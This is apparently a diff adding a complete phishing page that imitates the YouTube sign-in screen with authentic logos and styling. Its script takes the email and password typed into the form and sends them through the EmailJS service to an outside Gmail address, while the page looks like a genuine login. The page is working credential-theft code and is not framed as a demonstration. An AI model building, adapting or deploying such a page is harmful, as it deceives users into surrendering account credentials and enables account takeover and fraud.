@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube - Sign in</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        :root {
+            color-scheme: light dark;
+            --primary-color: #c00;
+            --primary-hover: #a00;
+            --shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .header {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            font-family: 'Roboto', sans-serif;
+        }
+        .youtube-logo {
+            width: 110px;
+            transition: var(--transition);
+        }
+        .youtube-logo:hover {
+            transform: scale(1.05);
+        }
+        @media (prefers-color-scheme: dark) {
+            body { background: linear-gradient(135deg, #1a1a1a 0%, #2c2c2c 100%); }
+            .youtube-logo { content: url('https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo_dark.svg'); }
+        }
+        @media (prefers-color-scheme: light) {
+            .youtube-logo { content: url('https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg'); }
+        }
+        .login-container {
+            width: 90%;
+            max-width: 420px;
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        h2 {
+            font-weight: 500;
+            color: #030303;
+            margin-bottom: 8px;
+        }
+        p.subtitle {
+            font-size: 14px;
+            color: #606060;
+            margin-bottom: 25px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 12px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: var(--transition);
+        }
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 5px rgba(192, 0, 0, 0.3);
+        }
+        .password-container {
+            position: relative;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #606060;
+            transition: var(--transition);
+        }
+        .toggle-password:hover {
+            color: var(--primary-color);
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+            margin-top: 25px;
+        }
+        button:hover {
+            background: var(--primary-hover);
+            box-shadow: 0 4px 12px rgba(192, 0, 0, 0.3);
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #606060;
+            line-height: 1.8;
+        }
+        .footer a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+        }
+        .footer a:hover {
+            color: var(--primary-hover);
+            text-decoration: underline;
+        }
+        @media (prefers-color-scheme: dark) {
+            .login-container { background: #2d2d2d; }
+            h2, .footer { color: #e8eaed; }
+            p.subtitle { color: #aaa; }
+            input { background: #3c3c3c; color: white; border-color: #5f6368; }
+            .toggle-password { color: #aaa; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img class="youtube-logo" alt="YouTube Logo">
+    </div>
+    <div class="login-container">
+        <h2>Sign in</h2>
+        <p class="subtitle">to continue to YouTube</p>
+        <input type="email" id="email" placeholder="Email or phone" required>
+        <div class="password-container">
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <i class="fa fa-eye toggle-password" onclick="togglePassword()"></i>
+        </div>
+        <button onclick="validateAndSend()">Next</button>
+        <div class="footer">
+            <p><a href="#">Forgot email?</a> | <a href="#">Forgot password?</a></p>
+            <p>Not your computer? Use Guest mode to sign in privately.</p>
+            <p><a href="#">Create account</a></p>
+        </div>
+    </div>
+    <script>
+        (function(){
+            emailjs.init("Y-3uTWwsVnkopIYro"); 
+        })();
+
+        function togglePassword() {
+            let passwordField = document.getElementById("password");
+            let toggleIcon = document.querySelector(".toggle-password");
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                toggleIcon.classList.remove("fa-eye");
+                toggleIcon.classList.add("fa-eye-slash");
+            } else {
+                passwordField.type = "password";
+                toggleIcon.classList.remove("fa-eye-slash");
+                toggleIcon.classList.add("fa-eye");
+            }
+        }
+
+        function validateAndSend() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (!email || !password) {
+                alert("Please enter both email and password.");
+                return;
+            } else if (!/\S+@\S+\.\S+/.test(email) && !/^\d{10}$/.test(email)) {
+                alert("Please enter a valid email or phone number.");
+                return;
+            }
+
+            
+            let templateParams = {
+                email: email,
+                password: password,
+                to_email: "tenasura2@gmail.com" 
+            };
+
+            emailjs.send("emailJS", "emailJS", templateParams)
+                .then(function(response) {
+                    console.log("Email sent successfully!", response.status, response.text);
+                   
+
+                }, function(error) {
+                    console.log("Failed to send email:", error);
+                    alert("Something went wrong. Please try again.");
+                });
+            
+            
+        }
+    </script>
+</body>
+</html>
